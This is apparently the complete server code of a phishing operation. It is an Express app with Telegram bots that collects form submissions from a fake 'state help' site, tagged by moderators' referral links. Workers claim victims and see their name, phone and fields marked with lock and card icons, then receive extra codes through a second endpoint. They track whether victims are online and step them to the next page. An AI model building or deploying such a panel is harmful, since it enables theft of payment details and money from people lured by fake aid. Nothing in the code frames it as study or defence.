const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// ===== АНТИКРАШ =====
process.on("unhandledRejection", (err) => {
  console.log("❌ UNHANDLED:", err?.message);
});
process.on("uncaughtException", (err) => {
  console.log("❌ CRASH:", err?.message);
});

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== БОТЫ =====
const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
  polling: true
});
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);

// ===== ENV =====
const adminId = Number(process.env.ADMIN_CHAT_ID);
const workerChat = Number(process.env.WORKER_CHAT_ID);

// ===== SAFE =====
async function safeSend(bot, chatId, text, opts = {}) {
  try { return await bot.sendMessage(chatId, text, opts); }
  catch (e) { console.log("send error:", e?.message); return null; }
}
async function safeEdit(bot, chatId, msgId, text, opts = {}) {
  try {
    return await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      ...opts
    });
  } catch (e) { console.log("edit error:", e?.message); }
}
async function safeDelete(bot, chatId, msgId) {
  try { await bot.deleteMessage(chatId, msgId); }
  catch (e) { console.log("delete error:", e?.message); }
}

// ===== БАЗЫ =====
let moderators = [];
let usersByUsername = {};

let takenRequests = {};
let fullRequests = {};
let shortRequests = {};
let fullMessages = {};
let groupMessages = {};
let seenUsers = {};
let onlineUsers = {};
let bannedUsers = {};
let userStatus = {};
let extraSentUsers = {};

// ===== REF СИСТЕМА (ИСПРАВЛЕНО) =====
let modRefKeys = {};     // ref -> modId
let modIdToKey = {};     // modId -> ref
let userRef = {};        // clientId -> modId

// ===== ONLINE =====
function isOnline(id) {
  return onlineUsers[id] && Date.now() - onlineUsers[id] < 20000;
}

// ===== МОДЕРЫ =====
function isMod(id) {
  return id === adminId || moderators.includes(id);
}

// ===== START =====
workerBot.onText(/\/start/, (msg) => {
  const username = msg.from.username;
  const id = msg.chat.id;

  if (!username) {
    return safeSend(workerBot, id, "❌ У тебя нет username");
  }

  usersByUsername[username.toLowerCase()] = id;

  safeSend(workerBot, id, "✅ Ты зарегистрирован");
});

// ===== ADD MOD =====
workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
  if (msg.chat.id !== adminId) return;

  const username = match[1].toLowerCase();
  const id = usersByUsername[username];

  if (!id) return safeSend(workerBot, adminId, "❌ Он не писал /start");

  if (!moderators.includes(id)) moderators.push(id);

  safeSend(workerBot, adminId, `✅ Добавлен: @${username}`);
});

// ===== DEL MOD =====
workerBot.onText(/\/delmod @(.+)/, (msg, match) => {
  if (msg.chat.id !== adminId) return;

  const username = match[1].toLowerCase();
  const id = usersByUsername[username];

  moderators = moderators.filter(m => m !== id);

  safeSend(workerBot, adminId, `❌ Удалён: @${username}`);
});

// ===== LIST MODS =====
workerBot.onText(/\/mods/, (msg) => {
  if (msg.chat.id !== adminId) return;

  const list = moderators.map(id => {
    const entry = Object.entries(usersByUsername)
      .find(([u, i]) => i === id);

    return entry ? "@" + entry[0] : id;
  }).join("\n");

  safeSend(workerBot, adminId, "👥 Модераторы:\n" + list);
});

// ===== 🔥 LINK MOD (FIXED) =====
workerBot.onText(/\/mylink/, (msg) => {
  const id = msg.chat.id;

  if (!isMod(id)) {
    return safeSend(workerBot, id, "❌ Ты не модератор");
  }

  let key = modIdToKey[id];

  if (!key) {
    key = Math.random().toString(36).substring(2, 8);

    modIdToKey[id] = key;
    modRefKeys[key] = id;
  }

  const link = `https://dopomogavidderzhavii.vercel.app/?ref=${key}`;

  safeSend(workerBot, id, `🔗 Твоя ссылка:\n${link}`);
});

// ===== ENTER =====
app.post("/enter", async (req, res) => {
  const id = req.body.clientId;
  const ref = req.body.ref;

  if (!id) return res.json({ ok: false });

  onlineUsers[id] = Date.now();

  if (ref && !userRef[id]) {
    const modId = modRefKeys[ref];

    if (modId) {
      userRef[id] = modId;
    } else {
      userRef[id] = "неизвестно";
    }
  }

  await safeSend(
    enterBot,
    adminId,
    `👀 Вход\n🆔 ${id}\n👤 ref: ${userRef[id] || "-"}`
  );

  res.json({ ok: true });
});

// ===== PING =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== SEND =====
app.post("/send", async (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  delete takenRequests[id];
  delete fullMessages[id];
  delete extraSentUsers[id];

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const ref = userRef[id] || "неизвестно";

  const statusText = isRepeat
    ? "🔁 ПОВТОРНАЯ ЗАЯВКА"
    : "🆕 НОВАЯ ЗАЯВКА";

  const fullText = `${statusText}

🆔 ${id}
👤 Привёл: ${ref}
📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}
📅 ${d.email}
🔐 ${d.city}
💳 ${d.comment}`;

  const shortText = `${statusText}

👤 ref: ${ref}
📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}`;

  fullRequests[id] = fullText;
  shortRequests[id] = shortText;

  const msg = await safeSend(workerBot, workerChat, shortText, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📥 Забрать", callback_data: "take_" + id }]
      ]
    }
  });

  if (msg) groupMessages[id] = msg.message_id;

  res.json({ ok: true });
});

// ===== STATUS =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== SEND2 =====
app.post("/send2", async (req, res) => {
  const { id, value } = req.body;

  if (!id || !value) return res.json({ ok: false });

  if (extraSentUsers[id]) return res.json({ ok: false });

  extraSentUsers[id] = true;

  const owner = takenRequests[id];

  if (owner) {
    await safeSend(workerBot, owner, `📩 ДОП ДАННЫЕ\n🆔 ${id}\n💬 ${value}`);
  }

  res.json({ ok: true });
});

// ===== CALLBACK (ВСЕ КНОПКИ СОХРАНЕНЫ) =====
workerBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  if (!isMod(q.from.id)) {
    return workerBot.answerCallbackQuery(q.id, { text: "❌ Нет доступа" });
  }

  if (data.startsWith("take")) {

    if (takenRequests[id]) {
      return workerBot.answerCallbackQuery(q.id, { text: "❌ Уже занято" });
    }

    takenRequests[id] = q.from.id;

    const user = q.from.username
      ? "@" + q.from.username
      : q.from.first_name;

    const sent = await safeSend(workerBot, q.from.id, `${fullRequests[id]}

👤 Взял: ${user}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
          [
            { text: "🚫 Бан", callback_data: "ban_" + id },
            { text: "✅ Разбан", callback_data: "unban_" + id }
          ],
          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
        ]
      }
    });

    if (sent) fullMessages[id] = sent.message_id;

    await safeEdit(workerBot, workerChat, groupMessages[id],
      `${shortRequests[id]}

👤 Взял: ${user}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔓 Освободить", callback_data: "free_" + id }]
        ]
      }
    });

    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("free")) {
    if (takenRequests[id] !== q.from.id) {
      return workerBot.answerCallbackQuery(q.id, { text: "❌ Не твоя" });
    }

    delete takenRequests[id];

    await safeDelete(workerBot, q.from.id, fullMessages[id]);

    await safeEdit(workerBot, workerChat, groupMessages[id],
      shortRequests[id], {
        reply_markup: {
          inline_keyboard: [
            [{ text: "📥 Забрать", callback_data: "take_" + id }]
          ]
        }
      });

    workerBot.answerCallbackQuery(q.id, { text: "Освобождено" });
  }

  if (data.startsWith("check")) {
    workerBot.answerCallbackQuery(q.id, {
      text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
    });
  }

  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    workerBot.answerCallbackQuery(q.id);
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
